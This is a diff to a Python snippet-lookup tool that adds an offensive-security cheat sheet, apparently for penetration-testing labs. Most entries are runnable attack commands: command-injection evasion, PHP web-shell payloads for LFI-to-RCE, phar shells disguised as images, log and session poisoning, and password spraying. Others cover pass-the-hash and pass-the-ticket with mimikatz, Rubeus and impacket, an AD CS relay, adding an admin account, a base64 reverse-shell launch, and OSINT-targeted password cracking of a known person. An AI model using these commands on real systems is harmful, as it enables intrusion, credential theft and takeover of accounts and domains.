@@ -4,6 +4,7 @@
 # dependencies = ["cyclopts>=3", "rich>=13"]
 # ///
 """snip: read-only snippet lookup. Add snippets by editing SNIPPETS below."""
+
 from __future__ import annotations
 
 import re
@@ -1422,6 +1423,586 @@ body = '''
 Laudanum   — on HTB Parrot/Kali at /usr/share/laudanum/
 Ninshang   — reverse-shell / webshell framework, check GitHub
 '''
+
+# ══ WEB — COMMAND INJECTION ══════════════════════════════════════════
+[web-cmdinj-operators]
+description = "command injection operators reference (separators + per-injection-type char sets)"
+lang = "text"
+tags = ["web", "command-injection", "reference"]
+body = '''
+Separator   Char   URL-enc   Executes
+Semicolon   ;      %3b       both
+New line    \n     %0a       both
+Background  &      %26       both (second output usually shown first)
+Pipe        \|     %7c       both (only second output shown)
+AND         &&     %26%26    both (only if first succeeds)
+OR          \|\|   %7c%7c    second only (if first fails)
+Sub-shell   ``     %60%60    both, Linux-only
+Sub-shell   $()    %24%28%29 both, Linux-only
+
+Injection type              Operators
+SQL Injection                ' , ; -- /* */
+Command Injection            ; &&
+LDAP Injection                * ( ) & \|
+XPath Injection               ' or and not substring concat count
+OS Command Injection          ; & \|
+Code Injection                 ' ; -- /* */ $() ${} #{} %{} ^
+Directory Traversal           ../ ..\\ %00
+Object Injection               ; & \|
+XQuery Injection               ' ; -- /* */
+Shellcode Injection            \x \u %u %n
+Header Injection               \n \r\n \t %0d %0a %09
+'''
+
+[web-cmdinj-evasion]
+description = "command injection filter evasion: spaces, slashes, case, reversing"
+lang = "bash"
+tags = ["web", "command-injection", "evasion"]
+body = '''
+# spaces
+%0a%09                       # tab
+%0a${IFS}                    # IFS value
+%0a{ls,-la}                  # bash brace expansion
+# Windows cmd: %HOMEPATH:~6,-11%   (env substring trick)
+# PowerShell:  $env:HOMEPATH[0]
+
+# slashes/semicolons via env var manipulation / character shifting
+${PATH:0:1}
+${LS_COLORS:10:1}
+$(tr '!-}' '"-~'<<<[)
+
+# command filters commonly weaved around
+# ' and " weave on Linux + Windows
+# $a and \ weave on Linux only
+# ^ weaves on Windows only
+
+# case manipulation (Windows shell is case-insensitive; Linux generally sensitive)
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+
+# reversing
+$(rev<<<'imaohw')
+"whoami"[-1..-20] -join ''
+iex "$('imaohw'[-1..-20] -join '')"
+
+# evasion payload libraries
+# PayloadsAllTheThings, DOSfuscation, bashfuscator
+'''
+
+[web-cmdinj-encoding]
+description = "base64 / UTF-16 command encoding for bash and PowerShell"
+lang = "bash"
+tags = ["web", "command-injection", "encoding"]
+body = '''
+# bash
+echo -n '{{command}}' | base64
+bash<<<$(base64 -d<<<{{b64_command}})
+
+# PowerShell (UTF-16LE encoded command, like -EncodedCommand expects)
+echo -n '{{command}}' | iconv -f utf-8 -t utf-16le | base64
+'''
+
+# ══ WEB — FILE INCLUSION / LFI / RFI ═════════════════════════════════
+[web-lfi-basics]
+description = "LFI/RFI basics and the path to RCE via upload+include"
+lang = "text"
+tags = ["web", "lfi", "rfi"]
+body = '''
+- first confirm the LFI, then check for RFI
+- remember Second-Order LFI (file written now, included later)
+- if the app has an image/file upload AND the LFI executes included content
+  regardless of file extension, mask a PHP shell as e.g. a .gif and include it via LFI
+- get the file's written path, then hit it through the LFI parameter
+- hide payloads via the zip:// or phar:// PHP wrappers (see web-lfi-wrappers)
+'''
+
+[web-lfi-wrappers]
+description = "PHP wrapper cheatsheet for LFI -> RCE (filter/data/input/expect)"
+lang = "bash"
+tags = ["web", "lfi", "php-wrappers", "rce"]
+body = '''
+# leak source/config as base64 (works even without allow_url_include)
+curl "http://{{target}}/index.php?language=php://filter/read=convert.base64-encode/resource={{path}}"
+# e.g. leak php.ini to check allow_url_include / allow_url_fopen:
+curl "http://{{target}}/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+
+# data:// wrapper (needs allow_url_include) — inline PHP payload as base64
+echo '<?php system($_GET["cmd"]); ?>' | base64
+curl "http://{{target}}/index.php?language=data://text/plain;base64,{{b64_payload}}&cmd=id"
+
+# php://input — POST body becomes the included code (function must accept $_REQUEST, not just $_POST)
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://{{target}}/index.php?language=php://input&cmd=id"
+
+# expect:// (rare, needs the expect extension)
+curl -s "http://{{target}}/index.php?language=expect://id"
+
+# ftp-based RFI (first check the LFI, then try remote inclusion)
+curl 'http://{{target}}/index.php?language=ftp://{{user}}:{{password}}@{{lhost}}/shell.php&cmd=id'
+'''
+
+[web-lfi-phar]
+description = "hide a PHP payload inside a phar archive disguised as an image"
+lang = "bash"
+tags = ["web", "lfi", "phar", "upload"]
+body = '''
+cat > shell.php << 'EOF'
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->stopBuffering();
+EOF
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+# upload shell.jpg, then trigger with the phar:// wrapper via the LFI
+'''
+
+[web-lfi-session-poison]
+description = "PHP session poisoning via PHPSESSID for LFI -> RCE"
+lang = "text"
+tags = ["web", "lfi", "session-poisoning"]
+body = '''
+Session files: /var/lib/php/sessions/ (Linux) or C:\Windows\Temp\ prefixed sess_ (Windows)
+1. Note your PHPSESSID cookie
+2. Set a page/field value that gets stored server-side in the session (e.g. a "language" or "theme" param)
+3. Set that value to an encoded webshell payload
+4. Include the session file via LFI: /var/lib/php/sessions/sess_<PHPSESSID>
+Note: invoking another shell needs re-poisoning the session first.
+'''
+
+[web-lfi-log-poison]
+description = "Apache/service log poisoning for LFI -> RCE"
+lang = "bash"
+tags = ["web", "lfi", "log-poisoning"]
+body = '''
+# fuzz for the log path, e.g. /var/log/apache2/access.log
+echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+curl -s "http://{{target}}:{{port}}/index.php" -H @Poison
+# then trigger via the LFI include of the log path, e.g.:
+# ?language=/var/log/apache2/access.log&cmd=id
+
+# other candidate log locations if you lack read access to server logs
+# (may need privileged users):
+#   /proc/self/environ
+#   /proc/self/fd/<PID>
+#   /var/log/sshd.log
+#   /var/log/mail
+#   /var/log/vsftpd.log
+#   /etc/apache2/envvars
+'''
+
+[web-lfi-old-php-bypass]
+description = "legacy PHP LFI forced-extension / null-byte bypass tricks"
+lang = "text"
+tags = ["web", "lfi", "legacy"]
+body = '''
+- exploit non-recursive string replacement in the include path
+- encoding tricks (see Command Injection > Evasion)
+- old PHP versions truncate paths at 4096 chars: start from a non-existent
+  directory, backtrack, and append "\." ~2048 times to defeat an appended extension
+- null-byte injection: %00 (very old PHP only)
+'''
+
+# ══ WEB — FILE UPLOAD ═════════════════════════════════════════════════
+[web-upload-clientside-bypass]
+description = "bypassing client-side upload validation"
+lang = "text"
+tags = ["web", "upload", "bypass"]
+body = '''
+Option 1: intercept and modify the upload request directly (backend variables,
+  optionally the Content-Type header) — request capture in Burp/ZAP.
+Option 2: modify the front-end JS/HTML to disable the validation before it fires.
+'''
+
+[web-upload-serverside-blacklist]
+description = "bypassing server-side extension blacklists"
+lang = "text"
+tags = ["web", "upload", "bypass"]
+body = '''
+- on Windows servers, extension checks are often case-insensitive — try .pHp, .PHP5
+- fuzz extensions against a wordlist (web-ffuf-dirs style) to find what the blacklist misses
+- exploit non-comprehensive blacklists, e.g. .phtml, .pht, .phar when .php is blocked
+- combine with the Content-Type swap from web-file-upload-bypass (application/x-php -> image/gif)
+'''
+
+# ══ CREDENTIAL ACCESS & LATERAL MOVEMENT ═════════════════════════════
+[cred-netexec-bruteforce]
+description = "NetExec credential brute-force against a single target"
+lang = "bash"
+tags = ["creds", "netexec", "bruteforce"]
+body = '''
+sudo apt-get -y install netexec
+netexec {{proto}} {{target}} -u {{user_or_userlist}} -p {{password_or_passwordlist}}
+netexec winrm {{target}} -u user.list -p password.list
+'''
+
+[cred-netexec-spray]
+description = "NetExec password spray across a range with a single fixed password"
+lang = "bash"
+tags = ["creds", "netexec", "spray"]
+body = '''
+netexec {{proto}} {{target}}/{{range}} -u {{user_or_userlist}} -p '{{fixed_password}}'
+netexec winrm {{subnet}}/24 -u user.list -p 'changeme123!'
+'''
+
+[cred-evilwinrm-login]
+description = "evil-winrm login with password or NTLM hash"
+lang = "bash"
+tags = ["creds", "winrm", "evil-winrm"]
+body = '''
+sudo gem install evil-winrm
+evil-winrm -i {{target_ip}} -u {{username}} -p {{password}}
+evil-winrm -i {{target_ip}} -u {{username}} -H {{ntlm_hash}}
+'''
+
+[cred-hydra-services]
+description = "Hydra brute-force against common network services + HTTP forms"
+lang = "bash"
+tags = ["creds", "hydra", "bruteforce"]
+body = '''
+hydra -L user.list -P password.list ssh://{{target}}
+hydra -L user.list -P password.list rdp://{{target}}
+hydra -L user.list -P password.list smb://{{target}}
+# outdated THC hydra may error on SMBv3 — note it and move to netexec
+
+## HTTP form
+hydra -l {{user}} -P password.list {{target}} http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+
+# RDP with a char-range brute (no wordlist)
+hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 {{target}} rdp
+'''
+
+[cred-msf-smb-login]
+description = "Metasploit smb_login brute-force scanner"
+lang = "text"
+tags = ["creds", "metasploit", "smb"]
+body = '''
+use auxiliary/scanner/smb/smb_login
+set user_file user.list
+set pass_file password.list
+run
+'''
+
+[cred-domain-join-linux]
+description = "join a Linux attack box to the target domain for Kerberos auth"
+lang = "bash"
+tags = ["creds", "kerberos", "domain-join"]
+body = '''
+echo "{{dc_ip}} {{dc_fqdn}} {{dc_short}}" | sudo tee -a /etc/hosts
+
+sudo tee /etc/krb5.conf << 'EOF'
+[libdefaults]
+    default_realm = {{REALM}}
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+
+[realms]
+    {{REALM}} = {
+        kdc = {{dc_fqdn}}
+        admin_server = {{dc_fqdn}}
+    }
+
+[domain_realm]
+    .{{domain_lower}} = {{REALM}}
+    {{domain_lower}} = {{REALM}}
+EOF
+
+export KRB5CCNAME=/tmp/{{user}}.ccache
+evil-winrm -i {{dc_fqdn}} -r {{domain_lower}}
+'''
+
+[cred-pth-windows-mimikatz]
+description = "Pass-the-Hash from Windows via mimikatz / Invoke-TheHash"
+lang = "powershell"
+tags = ["creds", "pth", "mimikatz", "windows"]
+body = '''
+mimikatz.exe privilege::debug "sekurlsa::pth /user:{{user}} /rc4:{{ntlm}} /domain:{{domain}} /run:cmd.exe"
+
+cd C:\tools\Invoke-TheHash\
+Import-Module .\Invoke-TheHash.psd1
+Invoke-SMBExec -Target {{target_ip}} -Domain {{domain}} -Username {{user}} -Hash {{ntlm}} -Command "net user {{newuser}} {{newpassword}} /add && net localgroup administrators {{newuser}} /add" -Verbose
+Invoke-WMIExec -Target {{target}} -Domain {{domain}} -Username {{user}} -Hash {{ntlm}} -Command "powershell -e {{b64_reverse_shell}}"
+'''
+
+[cred-pth-linux]
+description = "Pass-the-Hash from Linux (impacket / netexec / evil-winrm)"
+lang = "bash"
+tags = ["creds", "pth", "linux"]
+body = '''
+impacket-psexec {{user}}@{{target}} -hashes :{{ntlm}}
+impacket-wmiexec {{user}}@{{target}} -hashes :{{ntlm}}
+impacket-atexec {{user}}@{{target}} -hashes :{{ntlm}}
+impacket-smbexec {{user}}@{{target}} -hashes :{{ntlm}}
+
+# netexec (only works without LAPS)
+nxc smb {{subnet}}/24 -u {{user}} -d . -H {{ntlm}} --local-auth
+nxc smb {{subnet}}/24 -u {{user}} -d . -H {{ntlm}} --local-auth -x {{command}}
+
+evil-winrm -i {{target}} -u {{user}} -H {{ntlm}}
+'''
+
+[cred-pth-rdp]
+description = "RDP via Pass-the-Hash using Restricted Admin Mode"
+lang = "bash"
+tags = ["creds", "pth", "rdp"]
+body = '''
+# target-side: enable Restricted Admin Mode (disabled by default)
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+xfreerdp /v:{{target}} /u:{{user}} /pth:{{ntlm}}
+# NOTE: LocalAccountTokenFilterPolicy=0 in the registry means only RID-500
+# "Administrator" can do remote admin unless FilterAdministratorToken is set.
+'''
+
+[cred-ptt-mimikatz]
+description = "Pass-the-Ticket from Windows via mimikatz (export + inject)"
+lang = "text"
+tags = ["creds", "ptt", "kerberos", "mimikatz"]
+body = '''
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets /export
+dir *.kirbi
+kerberos::ptt "{{ticket_file}}.kirbi"
+misc::cmd
+
+# naming: tickets ending in $ are a computer account; @ separates service and
+# domain; "krbtgt" in the name indicates a TGT rather than a service ticket.
+# Needs local administrator rights.
+'''
+
+[cred-ptt-rubeus]
+description = "Pass-the-Ticket / ticket requests via Rubeus"
+lang = "text"
+tags = ["creds", "ptt", "kerberos", "rubeus"]
+body = '''
+Rubeus.exe dump /nowrap
+Rubeus.exe dump /user:{{user}} /service:krbtgt /nowrap
+
+# get a TGT with an RC4 hash and inject it directly into the current logon session
+Rubeus.exe asktgt /user:{{user}} /rc4:{{ntlm}} /domain:{{domain}} /ptt
+
+# pass an existing ticket
+Rubeus.exe ptt /ticket:{{ticket_file}}.kirbi
+Rubeus.exe ptt /ticket:{{base64_ticket}}
+
+# protect session TGTs with a sacrificial logon, then pass into it
+Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+Rubeus.exe asktgt /user:{{user}} /domain:{{domain}} /aes256:{{aes256_key}} /ptt
+'''
+
+[cred-ptk-overpass-hash]
+description = "Pass the Key / OverPass-the-Hash — convert an NTLM/AES key into a full TGT"
+lang = "text"
+tags = ["creds", "ptk", "kerberos", "overpass-the-hash"]
+body = '''
+# reuses a password hash to get a full TGT without touching Kerberos pre-auth checks
+privilege::debug
+sekurlsa::ekeys
+
+Rubeus.exe asktgt /domain:{{domain}} /user:{{user}} /aes256:{{aes256_key}} /nowrap
+Rubeus.exe asktgt /domain:{{domain}} /user:{{user}} /rc4:{{ntlm}} /ptt
+sekurlsa::pth /domain:{{domain}} /user:{{user}} /ntlm:{{ntlm}}
+# Rubeus needs local administrator for PtK
+'''
+
+[cred-ptt-linux]
+description = "Pass-the-Ticket from Linux: ccache/keytab handling and impersonation"
+lang = "bash"
+tags = ["creds", "ptt", "kerberos", "linux"]
+body = '''
+# ccache lives in /tmp, pointed to by KRB5CCNAME (root-readable even with special perms)
+export KRB5CCNAME=/tmp/{{user}}.ccache
+smbclient //{{dc}}/{{share}} -k -c ls
+proxychains impacket-wmiexec {{dc}} -k
+
+# keytabs: pairs of principal + encrypted key, not host-specific
+find / -name *keytab* -ls 2>/dev/null
+klist -k -t {{keytab_file}}
+kinit {{principal}} -k -t {{keytab_file}}
+klist
+
+# secret extraction from a keytab (NTLM for PtH, AES for ticket forging/cracking)
+python3 /opt/keytabextract.py {{keytab_file}}
+
+# ccache <-> kirbi conversion
+impacket-ticketConverter {{ccache_file}} {{out}}.kirbi
+# C:\tools\Rubeus.exe ptt /ticket:c:\tools\{{out}}.kirbi
+
+# Linikatz: Linux-side credential dumper for Kerberos material
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+'''
+
+[cred-ptc-adcs-esc8]
+description = "Pass-the-Certificate via AD CS NTLM relay (ESC8)"
+lang = "bash"
+tags = ["creds", "ptc", "adcs", "esc8", "ntlm-relay"]
+body = '''
+# web enrolment is typically at CertSrv
+impacket-ntlmrelayx -t http://{{cert_srv_ip}}/certsrv/certfnsh.asp -adcs -smb2support --template KerberosAuthentication
+
+sudo certipy-ad find -u {{user}} -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable
+sudo certipy-ad relay -interface "{{my_ip}}" -ca '{{ca_name}}' -template KerberosAuthentication -target http://{{cert_adcs_ip}}
+
+# coerce authentication to trigger the relay
+sudo python3 -m pip install coercer
+coercer coerce -t {{dc_ip}} -d {{domain}} -u {{user}} -p '{{password}}' -l "{{my_ip}}" -vv
+# or printerbug / phishing
+python3 printerbug.py {{domain}}/{{user}}:'{{password}}'@{{target}} {{lhost}}
+
+# use the resulting PFX to get a TGT (needs PKINITtools, may need oscrypto)
+git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
+python3 -m venv .venv && source .venv/bin/activate && pip3 install -r requirements.txt
+python3 gettgtpkinit.py -cert-pfx {{cert}}.pfx -dc-ip {{dc_ip}} '{{domain}}/{{user}}' /tmp/{{user}}.ccache
+export KRB5CCNAME=/tmp/{{user}}.ccache
+impacket-secretsdump -k -no-pass -dc-ip {{dc_ip}} -just-dc-user Administrator '{{domain}}/{{computer}}$'@{{dc_fqdn}}
+'''
+
+[cred-shadow-credentials]
+description = "Shadow Credentials attack via msDS-KeyCredentialLink (pywhisker)"
+lang = "bash"
+tags = ["creds", "shadow-credentials", "pywhisker", "adcs"]
+body = '''
+# needs write access to the target's msDS-KeyCredentialLink (BloodHound AddKeyCredentialLink edge)
+pywhisker --dc-ip {{dc_ip}} -d {{domain}} -u {{user}} -p '{{password}}' --target {{victim}} --action add
+# outputs a PFX + password; use it to request a TGT:
+python3 gettgtpkinit.py -cert-pfx {{out}}.pfx -pfx-pass '{{pfx_password}}' -dc-ip {{dc_ip}} {{domain}}/{{victim}} /tmp/{{victim}}.ccache
+export KRB5CCNAME=/tmp/{{victim}}.ccache
+klist
+evil-winrm -i {{dc_fqdn}} -r {{domain}}
+# NOTE: if pre-auth fails due to missing EKU support, look at PassTheCert (LDAPS auth via cert)
+'''
+
+# ══ PASSWORD CRACKING & PROTECTED FILES ══════════════════════════════
+[crack-identify-hash]
+description = "identify a hash format and quick Python hashing"
+lang = "bash"
+tags = ["cracking", "hashid"]
+body = '''
+hashid -j {{some_hash}}
+hashid -m '{{some_hash}}'
+python3 -c "import hashlib; print(hashlib.sha1(b'{{string}}').hexdigest())"
+'''
+
+[crack-2john-extract]
+description = "extract crackable hashes from protected files with *2john tools"
+lang = "bash"
+tags = ["cracking", "john", "2john"]
+body = '''
+locate *2john*
+pdf2john {{file}}.pdf > file.hash
+ssh2john {{id_rsa}} > ssh.hash
+keepass2john {{db}}.kdbx > keepass.hash
+# generic pattern: <filetype>2john <file_to_crack> > file.hash
+'''
+
+[crack-john-modes]
+description = "John the Ripper common modes"
+lang = "bash"
+tags = ["cracking", "john"]
+body = '''
+john --single {{passwd_file}}
+john --incremental {{passwd_file}}          # uses the modes defined in john.conf
+john --wordlist={{wordlist}} {{hash_file}}
+john --format=ripemd-128 {{hash_file}}
+john --show --format={{format}} {{hash_file}}   # John Show also needs --format
+'''
+
+[crack-hashcat-basics]
+description = "hashcat dictionary/mask attack basics + rules"
+lang = "bash"
+tags = ["cracking", "hashcat"]
+body = '''
+hashcat -a 0 -m {{mode}} {{hashes}} {{wordlist}}        # -a 0 dictionary attack
+hashcat -a 3 -m {{mode}} {{hashes}} '?u?l?l?l?l?d?s'     # -a 3 mask attack
+hashcat -a 0 -m {{mode}} {{hashes}} {{wordlist}} -r /usr/share/hashcat/rules/best64.rule
+ls -l /usr/share/hashcat/rules
+'''
+
+[crack-hashcat-masks-ref]
+description = "hashcat mask-attack charset reference"
+lang = "text"
+tags = ["cracking", "hashcat", "masks"]
+body = '''
+?l  abcdefghijklmnopqrstuvwxyz
+?u  ABCDEFGHIJKLMNOPQRSTUVWXYZ
+?d  0123456789
+?h  0123456789abcdef
+?H  0123456789ABCDEF
+?s  space!"#$%&'()*+,-./:;<=>?@[]^_`{|}~
+?a  ?l?u?d?s
+?b  0x00 - 0xff
+'''
+
+[crack-hashcat-rules-ref]
+description = "hashcat custom rule function reference + mutate-a-wordlist example"
+lang = "text"
+tags = ["cracking", "hashcat", "rules"]
+body = '''
+:     do nothing
+l     lowercase all letters
+u     uppercase all letters
+c     capitalize the first letter, lowercase the rest
+sXY   replace all instances of X with Y
+$!    append the ! character (any literal char works after $)
+
+# mutate a wordlist with a custom rule file and dedupe the output
+hashcat --force {{wordlist}} -r {{custom}}.rule --stdout | sort -u > mutated.list
+'''
+
+[crack-hashcat-hybrid-combinator]
+description = "hashcat hybrid (-a 6/7) and combinator (-a 1) passes for short base words"
+lang = "bash"
+tags = ["cracking", "hashcat", "hybrid"]
+body = '''
+# combinator: join two wordlists word-for-word (e.g. AliceBob, AliceSmith)
+hashcat -m {{mode}} -a 1 {{hashes}} {{wordlist1}} {{wordlist2}} -O -w 3
+
+# hybrid: base word + mask tail (e.g. Baseball2024!, Alice1998!)
+hashcat -m {{mode}} -a 6 {{hashes}} {{wordlist}} '?d?d?d?d?s' -O -w 3
+'''
+
+[crack-targeted-wordlist-workflow]
+description = "building a small, high-signal OSINT-based wordlist + rule for a known target"
+lang = "text"
+tags = ["cracking", "osint", "wordlist", "methodology"]
+body = '''
+When targeting a single known individual, build a small base list from OSINT
+rather than relying on rockyou:
+1. Collect every meaningful token (names, places, employer, interests, teams)
+   with a tool like cewl or username-anarchy; save as {{target}}.txt
+2. Separately note number fragments from any known DOB/dates (full year, 2-digit
+   year, MMDD, full DOB) — used as append targets, not base words
+3. Write a rule file biasing toward the policy's required classes, e.g. the common
+   human pattern "Capitalized word + number + symbol" satisfies upper/lower/digit/
+   symbol requirements in one shot; save as {{target}}.rule
+4. Run order: targeted rule pass first (highest yield) -> hybrid mask pass with
+   the known number/symbol tails -> combinator pass joining short base words ->
+   fall back to broad community rules (rockyou, dive.rule) only if nothing lands
+5. Filter candidates against the real policy before hashing to save time:
+     hashcat --stdout {{target}}.txt -r {{target}}.rule | \
+       awk 'length($0) >= {{min_len}}' | \
+       grep -P '(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9])(?=.*[^A-Za-z0-9])' | \
+       hashcat -m {{mode}} -a 0 {{hashes}} -O -w 3
+'''
+
+[crack-wordlist-policy-filters]
+description = "grep-based wordlist filters to match a target password policy"
+lang = "bash"
+tags = ["cracking", "wordlist", "filters"]
+body = '''
+# minimum length (edit the {8,} to your policy's minimum)
+grep -E '^.{8,}$' {{wordlist}} > filtered.txt
+
+# require each character class present
+grep -E '[A-Z]' {{wordlist}} | grep -E '[a-z]' | grep -E '[0-9]' | \
+  grep -E '([!@#$%^&*].*){2,}' > filtered.txt
+
+# combined length + all-class check in one pass
+awk 'length($0) >= {{min_len}}' {{wordlist}} | \
+  grep -P '(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9])(?=.*[^A-Za-z0-9])'
+'''
+
 """
 # ────────────────────────────────────────────────────────────────────────────
 
